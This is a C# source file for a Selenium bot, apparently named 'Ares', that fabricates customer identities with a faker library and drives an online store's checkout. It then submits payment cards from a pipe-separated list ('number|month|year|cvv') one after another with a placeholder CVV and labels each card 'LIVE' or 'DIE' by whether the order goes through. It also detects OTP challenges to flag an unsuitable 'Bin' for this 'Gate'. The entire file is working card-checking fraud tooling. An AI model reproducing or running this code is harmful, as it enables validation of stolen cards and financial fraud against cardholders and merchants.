using Bogus;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;

namespace _0lymp.us.Gods
{
    public partial class Ares : Component
    {
        private static IWebDriver ares;
        public List<string> CardsList { get; set; }
        public string Url { get; set; }
        private Faker faker;
        private string address;
        private string address2;
        private string city;
        private string state;
        private string zip;
        private string phone;

        public Thread VerifyCardsThread;
        public Thread StateCardsThread;
        public Thread ReduceCardsThread;
        public Thread RefreshProgressThread;

        public delegate void VerifyCardsCompleteHandler();
        public delegate void StateCardsCompleteHandler(string card);
        public delegate void ReduceCardsCompleteHandler(string cards);
        public delegate void RefreshProgressCompleteHandler(int percent, string message, string typeMessage);

        public event VerifyCardsCompleteHandler VerifyCardsComplete;
        public event StateCardsCompleteHandler LiveCardComplete;
        public event StateCardsCompleteHandler DieCardComplete;
        public event ReduceCardsCompleteHandler ReduceCardsComplete;
        public event RefreshProgressCompleteHandler RefreshProgressComplete;

        private string FirstName { get; set; }
        private string SurName { get; set; }
        private string Email { get; set; }
        private string Password { get; set; }

        public Ares()
        {
            InitializeComponent();
            faker = new Faker();
        }

        public Ares(IContainer container)
        {
            container.Add(this);

            InitializeComponent();
        }


        public void VerifyCards()
        {
            FirstName = faker.Name.FirstName();
            SurName = faker.Name.LastName();
            Email = faker.Internet.Email();
            Password = faker.Internet.Password();
            address = faker.Address.StreetAddress();
            address2 = ((Math.Round(new Random().NextDouble()) == 0.0) ? "" : faker.Address.SecondaryAddress());
            city = faker.Address.City();
            state = faker.Address.State();
            zip = faker.Address.ZipCode("#####");
            phone = faker.Phone.PhoneNumber("##########");
            Load();
            ares.Kill();
            ExecuteRefreshProgressThread(0, "", "Success");
            this.VerifyCardsComplete();
        }

        private void Load()
        {
            try
            {
                ExecuteRefreshProgressThread(1, "Cargando ARES...", "Success");
                ares = Driver.Chrome();
                //ares = Driver.Gecko();
                ares.GoUrl(Url);
            }
            catch (NoSuchElementException) {/* throw;*/ }
            catch (StaleElementReferenceException) {/* throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }
            //Thread.Sleep(5000);

            IWebElement webElement = ares.ElementVisible(By.CssSelector("#root > div > div.Modal.is-shown.Modal--slideUpFromBottom > button > span"), "ExceptionLoad1");
            if (webElement.IsNotNull())
            {
                CloseModalCountry(webElement);
            }

            IWebElement webElement1 = ares.ElementVisible(By.CssSelector("body > div.t161-lightbox-container > div > div.close"), "ExceptionLoad");
            if (webElement1.IsNotNull())
            {
                CloseLightBox(webElement1);
            }

            IWebElement webElement2 = ares.ElementRandomVisible(By.CssSelector("#root > div > div.Main-body > div.Main-inner > div > div.PlpContainer-resultsSection.is-stickyHeader > div.PlpContainer-productListContainer > div.ProductList > div > div > div.Product-meta > div > header > a"), "ExceptionLoad2");

            if (webElement2.IsNotNull())
            {
                ProductQuikView(webElement2);
            }
            else
            {
                //System.Windows.Forms.MessageBox.Show("Test");
                ExecuteRefreshProgressThread(1, "ERROR ARES #1, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void CloseLightBox(IWebElement webElement)
        {
            try
            {
                webElement.JsClick();
            }
            catch (NoSuchElementException) {/* throw;*/ }
            catch (StaleElementReferenceException) {/* throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }
        }

        private void CloseModalCountry(IWebElement webElement)
        {
            try
            {
                webElement.JsClick();
            }
            catch (NoSuchElementException) {/* throw;*/ }
            catch (StaleElementReferenceException) {/* throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }
        }

        private void ProductQuikView(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(10, "Seleccionando Producto.", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) {/* throw;*/ }
            catch (StaleElementReferenceException) {/* throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }

            IWebElement webElement1 = ares.ElementVisible(By.CssSelector("#root > div > div.Main-body > div.Main-inner > div > div.ProductDetail > div.row.ProductDetail-columnContainer > div.col-md-6.col-lg-6.ProductDetail-details > div > div.ProductDetail-topGroupRightInner > div.ProductDetail-ctas > div.ProductDetail-secondaryButtonGroup > div > button"), "ExceptionProductQuikView");

            if (webElement1.IsNotNull())
            {
                AddToCart(webElement1);
            }
            else
            {
                ExecuteRefreshProgressThread(10, "ERROR ARES #2, Reiniciando proceso...", "Success");
                Restart();
            }
        }

        private void AddToCart(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(20, "Agregando Producto.", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) {/* throw;*/ }
            catch (StaleElementReferenceException) {/* throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }

            IWebElement webElement1 = ares.ElementVisible(By.CssSelector("#root > div > div.Main-body > div.Main-inner > div > div.ProductDetail > div.row.ProductDetail-columnContainer > div.col-md-6.col-lg-6.ProductDetail-details > div > div.ProductDetail-topGroupRightInner > div.ProductDetail-ctas > div.ProductDetail-secondaryButtonGroup > div > div > div > div > div > div.AddToBagConfirm > button.Button.AddToBagConfirm-goToCheckout.is-active.Button--threeFifthWidth"), "ExceptionAddToCart");

            if (webElement1.IsNotNull())
            {
                Checkout(webElement1);
            }
            else
            {
                if (ares.ElementTextContains(By.CssSelector("#root > div > div.Main-body > div.Main-inner > div > div.ProductDetail > div.row.ProductDetail-columnContainer > div.col-md-6.col-lg-6.ProductDetail-details > div > div.ProductDetail-topGroupRightInner > div.Message.is-shown.is-error > p"), "size", "ExceptionAddToCartSize").IsNotNull())
                {
                    SelectSize();
                }
                else
                {
                    ExecuteRefreshProgressThread(20, "ERROR ARES #3, Reiniciando proceso...", "Success");
                    Restart();
                }
            }
        }


        private void SelectSize()
        {
            try
            {
                ExecuteRefreshProgressThread(30, "Seleccionando talla.", "Success");
                (from x in ares.FindElements(By.CssSelector("#root > div > div.Main-body > div.Main-inner > div > div.ProductDetail > div.row.ProductDetail-columnContainer > div.col-md-6.col-lg-6.ProductDetail-details > div > div.ProductDetail-topGroupRightInner > div:nth-child(1) > div > div.ProductSizes.ProductSizes--pdp.ProductSizes--sizeGuideBox > div > button > span:not(.is-outOfStock)"))
                 orderby Guid.NewGuid()
                 select x).FirstOrDefault().JsClick();
            }
            catch (NoSuchElementException) {/* throw;*/ }
            catch (StaleElementReferenceException) {/* throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }

            IWebElement webElement1 = ares.ElementVisible(By.CssSelector("#root > div > div.Main-body > div.Main-inner > div > div.ProductDetail > div.row.ProductDetail-columnContainer > div.col-md-6.col-lg-6.ProductDetail-details > div > div.ProductDetail-topGroupRightInner > div.ProductDetail-ctas > div.ProductDetail-secondaryButtonGroup > div > button"), "ExceptionAddToCart");

            if (webElement1.IsNotNull())
            {
                AddToCart(webElement1);
            }
            else
            {
                ExecuteRefreshProgressThread(30, "ERROR ARES #4, Reiniciando Proceso...", "Success");
                Restart();
            }
        }

        private void Checkout(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(40, "Confirmando compra.", "Success");
                webElement.JsClick();
            }
            catch (NoSuchElementException) {/* throw;*/ }
            catch (StaleElementReferenceException) {/* throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }

            if (ares.ElementVisible(By.Id("Register-email"), "ExceptionCheckout").IsNotNull())
            {
                NewCustomer();
            }
            else
            {
                ExecuteRefreshProgressThread(40, "ERROR ARES #5, Reiniciando Proceso...", "Success");
                Restart();
            }
        }

        private void NewCustomer(bool newPassword = false)
        {
            try
            {
                ExecuteRefreshProgressThread(50, "Nuevo Usuario", "Success");
                if (newPassword)
                {
                    Password = faker.Internet.Password();
                    ares.FindElement(By.Id("Register-password")).Clear();
                    ares.FindElement(By.Id("passwordConfirm-password")).Clear();
                }
                else
                {
                    ares.FindElement(By.Id("Register-email")).SendKeys(Email);
                }
                //Thread.Sleep(1000);
                ares.FindElement(By.Id("Register-password")).SendKeys(Password);
                //Thread.Sleep(1000);
                ares.FindElement(By.Id("passwordConfirm-password")).SendKeys(Password);
                //Thread.Sleep(1000);
                ares.FindElement(By.CssSelector("#root > div > div.Main-body > div.Main-inner > section > div:nth-child(2) > div > div > section > section.LoginContainer-newUserSection > section > form > button")).JsClick();
            }
            catch (NoSuchElementException) {/* throw;*/ }
            catch (StaleElementReferenceException) {/* throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }

            IWebElement webElement1 = ares.ElementVisible(By.Id("title"), "ExceptionNewCustomer");
            if (webElement1.IsNotNull())
            {
                Delivery(webElement1);
            }
            else
            {
                IWebElement webElement2 = ares.ElementVisible(By.Id("password-error"), "ExceptionNewCustomerPassword");
                if (webElement2.IsNotNull())
                {
                    NewCustomer(true);
                }
                else
                {
                    ExecuteRefreshProgressThread(50, "ERROR ARES #6, Reiniciando Proceso...", "Success");
                    Restart();
                }
            }
        }

        private void Delivery(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(60, "Datos de entrega.", "Success");
                SelectElement selectTitle = new SelectElement(webElement);
                int maxValue = selectTitle.Options.Count();
                selectTitle.SelectByIndex(new Random().Next(1, maxValue));
                ares.FindElement(By.Id("firstName-text")).SendKeys(FirstName);
                ares.FindElement(By.Id("lastName-text")).SendKeys(SurName);
                ares.FindElement(By.Id("telephone-tel")).SendKeys(phone);
                ares.FindElement(By.Id("address1-text")).SendKeys(address);
                ares.FindElement(By.Id("address2-text")).SendKeys(address2);
                SelectElement selectState = new SelectElement(ares.FindElement(By.Id("state")));
                int maxValue1 = selectState.Options.Count();
                selectState.SelectByIndex(new Random().Next(0, maxValue1));

                ares.FindElement(By.Id("postcode-text")).SendKeys(zip);
                ares.FindElement(By.Id("city-text")).SendKeys(city);

                ares.FindElement(By.CssSelector("#root > div > div.Main-body > div.Main-inner > section > div:nth-child(2) > div.CheckoutContainer-groupLeft > section > div > section > div.DeliveryCTAProceed-nextButtonContainer > button")).JsClick();
            }
            catch (NoSuchElementException) { throw; }
            catch (StaleElementReferenceException) { throw; }
            catch (WebDriverException) { throw; }
            catch (NullReferenceException) { throw; }

            if (ares.ElementVisible(By.Id("cardNumber-tel"), "ExceptionDelevery").IsNotNull())
            {
                LastProccess();
            }
            else
            {
                ExecuteRefreshProgressThread(60, "ERROR ARES #7, Reiniciando Proceso...", "Success");
                Restart();
            }
        }

        private void LastProccess()
        {
            try
            {
                int num = 0;
                int countDie = 1;
                while (num < CardsList.Count())
                {
                    List<string> list = CardsList[num].Split('|').ToList();
                    if (CardsList.Count() > 1)
                    {
                        CardsList[num] = CardsList[num].Replace("\r", "");
                    }
                    string text = CardsList[num];
                    string cards = CardsList[num].ToString();
                    if (CardsList.Count() > 1)
                    {
                        string text3 = CardsList[num] = (CardsList[num] += "\r");
                        cards = string.Join("", CardsList.ToArray());
                        text += "\r";
                    }
                    Payment(list[0], list[1], list[2], list[3]);

                    if (Confirmation())
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteLiveCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        if (CardsList.Count() > 0)
                        {
                            Restart();
                        }
                    }
                    else
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteDieCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        if (countDie < 15)
                        {
                            countDie++;
                        }
                        else
                        {
                            Restart();
                        }
                    }
                }
            }
            catch (ArgumentOutOfRangeException) {/* throw;*/ }
        }

        private void Payment(string number, string month, string year, string cvv)
        {
            try
            {
                ExecuteRefreshProgressThread(80, "Añadiendo tarjeta: " + number, "Success");
                ares.FindElement(By.Id("cardNumber-tel")).Clear();
                Thread.Sleep(1000);
                ares.FindElement(By.Id("cardNumber-tel")).SendKeys(number);
                new SelectElement(ares.FindElement(By.Id("expiryMonth"))).SelectByValue(month);
                Thread.Sleep(1000);
                new SelectElement(ares.FindElement(By.Id("expiryYear"))).SelectByValue(year);
                ares.FindElement(By.Id("cvv-tel")).Clear();
                Thread.Sleep(1000);
                cvv = cvv.Replace("\r", "");
                switch (cvv.Count())
                {
                    case 3:
                        ares.FindElement(By.Id("cvv-tel")).SendKeys("000");
                        break;
                    case 4:
                        ares.FindElement(By.Id("cvv-tel")).SendKeys("0000");
                        break;
                }
                Thread.Sleep(1000);
                ares.FindElement(By.Id("SavePaymentDetails-checkbox")).JsClick();

                ares.FindElement(By.CssSelector("div.PaymentButtonContainer > button")).Click();
            }
            catch (NoSuchElementException) {/* throw;*/ }
            catch (StaleElementReferenceException) {/* throw;*/ }
            catch (WebDriverException) {/* throw;*/ }
            catch (NullReferenceException) {/* throw;*/ }

            if (ares.ElementVisible(By.CssSelector("#root > div > div.ContentOverlay.ContentOverlay--modalOpen"), "ExceptionPayment").IsNotNull())
            {
                IWebElement webElement1 = ares.ElementVisible(By.CssSelector("#root > div > div.Modal.is-shown.Modal--paymentPunchout > div > iframe"), "ExceptionPaymentIframe");
                if (webElement1.IsNotNull())
                {
                    IWebDriver aresAlt = ares;
                    aresAlt.SwitchTo().Frame(webElement1);
                    IWebElement webElement2 = aresAlt.ElementVisible(By.Id("ExitLink"), "ExceptionPaymentIframeExit");
                    if (webElement2.IsNotNull())
                    {
                        webElement2.Click();
                    }

                    if (aresAlt.ElementVisible(By.Id("sendotp")).IsNotNull())
                    {
                        ExecuteRefreshProgressThread(80, "ERROR ARES #9 Este Bin no es apto para este Gate, Deteniendo Proceso.", "Success");
                        ares.Kill();
                        this.VerifyCardsComplete();
                        ExecuteRefreshProgressThread(0, "", "Success");
                    }
                }
            }
            else
            {
                ExecuteRefreshProgressThread(80, "ERROR ARES #8, Reiniciando Proceso...", "Success");
                Restart();
            }
        }

        private bool Confirmation()
        {
            ExecuteRefreshProgressThread(90, "Confirmando.", "Success");
            //Thread.Sleep(2000);
            IWebElement webElement = ares.ElementVisible(By.CssSelector("#root > div > div.Main-body > div.Main-inner > section > div:nth-child(2) > div.CheckoutContainer-groupLeft > div > section > div > div > div.Message.is-shown.is-error > p"), "Die");

            if (webElement.IsNotNull())
            {
                ExecuteRefreshProgressThread(100, "DIE.", "Success");
                //Thread.Sleep(2000);
                return false;
            }
            else
            {
                //IWebElement webElement1 = ares.ElementVisible(By.CssSelector("#root > div > div.Modal.is-shown.Modal--paymentPunchout > div > iframe"), "DIE2", 20);

                //if (webElement1.IsNotNull())
                //{
                //    IWebDriver aresAlt = ares;
                //    aresAlt.SwitchTo().Frame(webElement1);
                //    if (aresAlt.ElementVisible(By.Id("sendotp"),"",20).IsNotNull())
                //    {
                //        ares.FindElement(By.CssSelector("#root > div > div.Modal.is-shown.Modal--paymentPunchout > button")).Click();
                //        return false;
                //    }
                //    //Thread.Sleep(1000);
                //    //ares.SwitchTo().DefaultContent();
                //    //Thread.Sleep(2000);
                //}
                //else
                //{
                IWebElement webElement2 = ares.ElementVisible(By.CssSelector("#root > div > div.Main-body > div.Main-inner > section > div > div.OrderSuccess-container > div.OrderSuccess-left > div.OrderSuccess-orderDetailsHeader > h1"), "LIVE");
                if (webElement2.IsNotNull())
                {
                    ExecuteRefreshProgressThread(100, "LIVE.", "Success");
                    return true;
                }
                //}
            }
            Restart();
            return false;
        }

        private void Restart()
        {
            ares.Kill();
            VerifyCards();
        }

        public void ExecuteThread()
        {
            VerifyCardsThread = new Thread(VerifyCards);
            VerifyCardsThread.Start();
        }

        private void ExecuteRefreshProgressThread(int percent, string message, string typeMessage)
        {
            RefreshProgressThread = new Thread((ThreadStart)delegate
            {
                RefreshProgress(percent, message, typeMessage);
            });
            RefreshProgressThread.Start();
        }

        public void KillThread()
        {
            try
            {
                ExecuteRefreshProgressThread(0, "", "Success");
                VerifyCardsThread.Abort();
                VerifyCardsThread.Join();
                ares.Kill();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteLiveCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                LiveCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillLiveCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteDieCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                DieCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillDieCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteReduceCardsThread(string cards)
        {
            ReduceCardsThread = new Thread((ThreadStart)delegate
            {
                ReduceCards(cards);
            });
            ReduceCardsThread.Start();
        }

        public void KillReduceCardsThread()
        {
            try
            {
                ReduceCardsThread.Abort();
                ReduceCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }
        private void RefreshProgress(int percent, string message, string typeMessage)
        {
            try
            {
                this.RefreshProgressComplete(percent, message, typeMessage);
            }
            catch (NullReferenceException) {/* throw;*/ }
        }

        public void ReduceCards(string cards)
        {
            this.ReduceCardsComplete(cards);
        }

        private void LiveCard(string card)
        {
            this.LiveCardComplete(card);
        }

        private void DieCard(string card)
        {
            this.DieCardComplete(card);
        }


    }
}
